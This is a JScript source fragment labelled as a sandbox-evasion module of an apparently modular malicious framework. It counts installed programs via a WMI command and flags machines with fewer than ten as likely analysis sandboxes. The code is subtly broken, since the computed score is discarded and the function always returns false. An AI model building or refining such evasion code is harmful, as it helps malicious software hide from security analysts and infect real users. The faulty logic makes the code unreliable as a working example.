// chunk: evasion/installed_software
// depends: core/run_cmd
// provides: check_software
// format: jscript
// note: Counts installed software via WMI. Sandboxes typically have fewer
//       than 10 installed programs compared to real user machines.

function check_software() {
    var score = 0;
    try {
        var out = _run('wmic product get name /format:csv 2>nul');
        var lines = out.split("\n");
        var count = 0;
        for (var i = 0; i < lines.length; i++) {
            var line = lines[i].replace(/\s/g, "");
            if (line.length > 0 && line.indexOf("Name") < 0 && line.indexOf("Node") < 0) count++;
        }
        if (count < 10) score++;
    } catch(e) {}
    return false;
}
